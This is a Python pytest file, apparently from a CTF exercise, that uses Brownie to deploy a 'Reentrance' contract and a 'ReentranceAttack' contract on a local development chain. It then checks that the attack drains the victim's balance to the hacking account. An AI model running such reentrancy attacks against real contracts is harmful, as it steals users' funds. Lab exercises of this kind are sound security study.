from web3 import Web3
from brownie import Reentrance, ReentranceAttack, config, network
from scripts.reentrance import initial_setup, reentrance_attack
from scripts.helpers import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS

import pytest


def test_reentrance_attack():
    # Arrange
    if network.show_active() != "development":
        pytest.skip("Testing only for dev environment")
    # - deploy and fund the original contract:
    reentrance__original_contract_address = initial_setup()
    # - deploy attack contract:
    hacking_account = get_account()
    reentrance_attack_contract = ReentranceAttack.deploy(reentrance__original_contract_address, {"from": hacking_account})

    # Act 
    # - get balances of the original contract before attack:
    balance_before_attack = reentrance_attack_contract.getBalanceOfInstance()
    attacker_contract_balance_before_attack = reentrance_attack_contract.balance()
    # - attack
    ETHER_TO_SEND = Web3.toWei("0.1", "ether")
    reentrance_attack_contract.attack({"from": hacking_account, "value": ETHER_TO_SEND})
    # - get balance after attack
    balance_after_attack = reentrance_attack_contract.getBalanceOfInstance()
    attacker_contract_balance_after_attack = reentrance_attack_contract.balance()
    # - withdraw contract by hacking account
    hacking_account_balance_before_atack = hacking_account.balance()
    reentrance_attack_contract.withdrawContract(hacking_account)
    hacking_account_balance_after_atack = hacking_account.balance()

    # Assert
    assert balance_after_attack == 0
    assert balance_before_attack == (attacker_contract_balance_after_attack - ETHER_TO_SEND)
    assert hacking_account_balance_after_atack == (hacking_account_balance_before_atack + attacker_contract_balance_after_attack)

